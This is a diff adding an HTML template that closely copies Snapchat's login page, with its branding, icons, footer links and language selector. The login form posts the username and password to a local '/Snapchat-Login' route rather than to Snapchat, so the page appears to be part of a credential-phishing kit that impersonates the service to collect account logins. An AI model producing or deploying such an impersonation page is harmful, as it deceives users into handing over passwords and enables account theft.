@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+
+{% block title %}
+<title>Log In • Snapchat</title>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="origin">
+    <meta name="apple-mobile-app-capable" content="no">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
+{% endblock %}
+
+{% block styles %}
+ <!-- Styles -->
+<link rel="stylesheet" href="{{url_for('.static', filename='style.css')}}">
+<link rel="stylesheet" href="https://snapnet-cdn.storage.googleapis.com/fonts/avenir-next/avenirnext.font.css">
+<link rel="shortcut icon" href="{{url_for('.static', filename='/images/favicon/favicon.png')}}" type="image/png">
+{% endblock %}
+
+
+{% block content %}
+
+<body>
+<div class="pusher">
+    <div id="login-root">
+        <div class="full-background-color"></div>
+        <div class="Login">
+            <article class="page">
+                <div class="container">
+                    <img class="snapchat-icon" src="{{ url_for('static', filename='images/ghost/snapchat-app-icon.svg') }}" alt="Snapchat">
+                    <h1 class="accountTitle">Log in to Snapchat</h1>
+                    <div>
+                        <form class="centered_form" action="/Snapchat-Login" id="Login_form" method="POST" >
+                            <div class="form-group has-succes">
+                                {{ form.hidden_tag() }}
+                                {{ form.username.label(class="control-label") }}
+                                {{ form.username(class="form-control") }}
+                            </div>
+                            <div class="form-group has-succes">
+                                {{ form.hidden_tag() }}
+                                {{ form.password.label(class="control-label") }}
+                                {{ form.password(class="form-control") }}
+
+                            </div>
+                            <p class="secondary_action">
+                                <a href="https://accounts.snapchat.com/accounts/password_reset_options">Forgot Password</a>
+                            </p>
+                            <div class="primary-action">
+                                <button type="submit" class="btn btn-lg btn-primary">Log In</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <div class="create-account-cta">
+                    <span>New To Snapchat?</span>
+                    <a href="https://accounts.snapchat.com/accounts/signup?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome">
+                        Sign Up
+                    </a>
+                </div>
+            </article>
+            <div class="footer">
+                <div style="background-color: rgb(248, 249, 251); font-size: 14px; line-height: 17px;">
+                    <style>
+                        
+                        .footer-container,
+                        .footer-bottom-bar {
+                            width: 92.3%;
+                            max-width: 1070px;
+                            margin: auto;
+                        }
+
+                        .footer-container {
+                            box-sizing: content-box;
+                            position: relative;
+                            padding: 30px 0 30px;
+                            min-height: 195px;
+                        }
+
+                        .footer-container .footer-column {
+                            position: relative;
+                            box-sizing: border-box;
+                            float: left;
+                            width: 25%;
+                            padding-right: 6.25%;
+                        }
+
+                        .footer-container .footer-column .footer-column-header {
+                            box-sizing: content-box;
+                            line-height: 23px;
+                            font-weight: bold;
+                        }
+
+                        .footer-container .footer-column .footer-column-expand-caret {
+                            display: none;
+                        }
+
+                        .footer-container .footer-column a {
+                            display: table;
+                            color: rgba(0, 0, 0, 0.4);
+                            text-decoration: none;
+                            line-height: 17px;
+                            margin-top: 6px;
+                        }
+                        .footer-container .footer-column a:hover {
+                            color: black;
+                        }
+
+                        .footer-container .langue-selection-block {
+                            position: absolute;
+                            box-sizing: border-box;
+                            padding: 0 6.25% 15px 0;
+                            bottom: 15px;
+                            width: 25%;
+                        }
+                        .footer-container .langue-selection-block .langue-header {
+                            font-weight: bold;
+                        }
+
+                        .footer-bottom-bar a {
+                            line-height: 56px;
+                            margin-right: 40px;
+                            color: white;
+                            text-decoration: none;
+                        }
+
+                        @media (max-width: 767px) {
+                            .footer-container,
+                            .footer-bottom-bar {
+                            width: 100%;
+                            padding: 0;
+                            max-width: none;
+                            }
+
+                            .footer-container .footer-column {
+                            padding: 0;
+                            width: 100%;
+                            }
+
+                            .footer-container .footer-column a,
+                            .footer-container .footer-column .footer-column-header {
+                            margin-top: 0;
+                            padding: 10px 40px;
+                            width: calc(100% - 80px);
+                            line-height: 25px;
+                            }
+
+                            .footer-container .footer-column .footer-column-header,
+                            .footer-container .langue-selection-block {
+                            border-top: solid 1px #D4D4D4;
+                            }
+
+                            .footer-container .footer-column .footer-column-header {
+                            cursor: pointer;
+                            background-color: white;
+                            }
+
+                            .footer-container .footer-column .footer-column-expand-caret {
+                            display: block;
+                            position: absolute;
+                            left: 16px;
+                            top: 15px;
+                            width: 15px;
+                            height: 20px;
+                            transform-origin: 55% 45%;
+                            cursor: pointer;
+                            }
+                            .footer-container .footer-column.expanded .footer-column-expand-caret {
+                            transform: rotate(90deg);
+                            -webkit-transform: rotate(90deg);
+                            }
+
+                            .footer-container .footer-column a {
+                            font-weight: 600;
+                            color: black;
+                            border-top: solid 1px #E5E5E5;
+                            display: none;
+                            }
+                            .footer-container .footer-column.expanded a {
+                            display: block;
+                            box-sizing: content-box;
+                            }
+
+                            .footer-container .langue-selection-block {
+                            position: static;
+                            width: 100%;
+                            height: inherit;
+                            top: inherit;
+                            padding: 14px 20px 15px;
+                            }
+
+                            .footer-bottom-bar a {
+                            display: block;
+                            line-height: 45px;
+                            margin-right: 0;
+                            padding-left: 20px;
+                            border-bottom: solid 1px #D4D4D4;
+                            }
+                        }
+                    </style>
+                    <div class="footer-container" id="footerContainer">
+                        <div class="footer-column">
+                            <div class="footer-column-expand-caret">
+                                <svg width="15" height="20">
+                                    <g>
+                                     <rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+                                     <rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+                                 </g>
+                             </svg>
+                            </div>
+                            <div class="footer-column-header">Company</div>
+                            <div>
+                                <a href="https://snap.com/en-US">Snap Inc.</a>
+                                <a href="https://careers.snap.com/">Careers</a>
+                                <a href="https://snap.com/en-US/news/">News</a>
+                            </div>
+                        </div>
+                        <div class="footer-column">
+                            <div class="footer-column-expand-caret">
+                                <svg width="15" height="20">
+                                    <g>
+                                     <rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+                                     <rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+                                 </g>
+                             </svg>
+                            </div>
+                            <div class="footer-column-header">Community</div>
+                            <div>
+                                <a href="https://support.snapchat.com/en-GB">Support</a>
+                                <a href="https://support.snapchat.com/en-GB/a/guidelines">Community Guidlines</a>
+                                <a href="https://www.snap.com/en-GB/safety/safety-center">Safety Center</a>
+                            </div>
+                        </div>
+                        <div class="footer-column">
+                            <div class="footer-column-expand-caret">
+                                <svg width="15" height="20">
+                                    <g>
+                                     <rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+                                     <rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+                                 </g>
+                             </svg>
+                            </div>
+                            <div class="footer-column-header">Advertising</div>
+                            <div>
+                                <a href="https://snapchat.com/ads">Buy Ads</a>
+                                <a href="https://snap.com/en-US/ad-policies">Advertising Policies</a>
+                                <a href="https://snap.com/en-US/political-ads">Political Ads Library</a>
+                                <a href="https://snap.com/en-US/brand-guidelines/">Brand Guidlines</a>
+                                <a href="https://support.snapchat.com/en-GB/a/promotions-rules">Promotions Rules</a>
+                            </div>
+                        </div>
+                        <div class="footer-column">
+                            <div class="footer-column-expand-caret">
+                                <svg width="15" height="20">
+                                    <g>
+                                     <rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+                                     <rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+                                 </g>
+                             </svg>
+                            </div>
+                            <div class="footer-column-header">Legal</div>
+                            <div>
+                                <a href="https://snap.com/en-US/privacy/privacy-center">Privacy Center</a>
+                                <a href="https://snap.com/en-US/cookie-policy">Cookie Policy</a>
+                                <a href="https://support.snapchat.com/en-GB/article/infringement-reporting-about">Report Infringement</a>
+                                <a href="https://snap.com/en-US/terms/custom-creative-tools">Custom Creative Tools Terms</a>
+                                <a href="https://www.snapchat.com/create/terms.html">Community Geofilter Terms</a>
+                                <a href="https://snap.com/en-US/terms/lens-studio-terms">Lens Studio Terms</a>
+                            </div>
+                        </div>
+                        <div class="clear: both;"></div>
+                        <div class="langue-selection-block">
+                            <div class="langue-header">Language</div>
+                            <div style="position: relative;">
+                                <select id="sc-global-locale-selector" style="appearance: none; border: 1px solid rgb(204, 204, 204); border-radius: 5px; background: white; width: 100%; margin-top: 10px; padding: 5px 10px; font-size: 14px; font-family: inherit; color: rgba(0, 0, 0, 0.6); height: 34px; cursor: pointer;">
+                                    <option value="ar">العَرَبِية</option>
+                                    <option value="da-DK">Dansk</option>
+                                    <option value="de-DE">Deutsch</option>
+                                    <option value="el-GR">Ελληνικά</option>
+                                    <option value="en-GB">English (UK)</option>
+                                    <option value="en-US" selected="">English (US)</option>
+                                    <option value="es">Español</option>
+                                    <option value="fi-FI">Suomi</option>
+                                    <option value="fil-PH">Filipino</option>
+                                    <option value="fr-FR">Français</option>
+                                    <option value="gu-IN">ગુજરાતી</option>
+                                    <option value="hi-IN">हिंदी</option>
+                                    <option value="id-ID">Bahasa Indonesia</option>
+                                    <option value="it-IT">Italiano</option>
+                                    <option value="ja-JP">日本語</option>
+                                    <option value="ko-KR">한국어</option>
+                                    <option value="mr-IN">मराठी</option>
+                                    <option value="ms-MY">Bahasa Melayu</option>
+                                    <option value="nb-NO">Norsk</option>
+                                    <option value="nl-NL">Nederlands</option>
+                                    <option value="pl-PL">Polski</option>
+                                    <option value="pt-BR">Português (Brasil)</option>
+                                    <option value="pt-PT">Português (Portugal)</option>
+                                    <option value="ro-RO">Română</option>
+                                    <option value="ru-RU">Русский</option>
+                                    <option value="sv-SE">Svenska</option>
+                                    <option value="tr-TR">Türkçe</option>
+                                    <option value="ur-PK">اردو</option>
+                                    <option value="vi-VN">Tiếng Việt</option>
+                                    <option value="zh-CN">中文（简体）</option>
+                                    <option value="zh-TW">中文（繁體）</option>
+                                </select>
+                                <div style="position: absolute; right: 10px; width: 0px; height: 0px; pointer-events: none; border-style: solid; bottom: 18px; border-width: 0px 3px 5px; border-color: transparent transparent rgb(102, 102, 102);"></div>
+                                <div style="position: absolute; right: 10px; width: 0px; height: 0px; pointer-events: none; border-style: solid; bottom: 10px; border-width: 5px 3px 0px; border-color: rgb(102, 102, 102) transparent transparent;"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="background-color: rgb(38,38,38);">
+                        <div class="footer-bottom-bar">
+                            <a href="https://snap.com/en-US/privacy/privacy-policy/">Privacy Policy</a>
+                            <a href="https://snap.com/en-US/terms">Terms of Service</a>
+                            <div style="clear: both;"></div>
+                        </div>
+                    </div>
+                    <div id="cookiePopupContainer">
+                        <!--Empty CookiePolicyDiv-->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+{% endblock %}
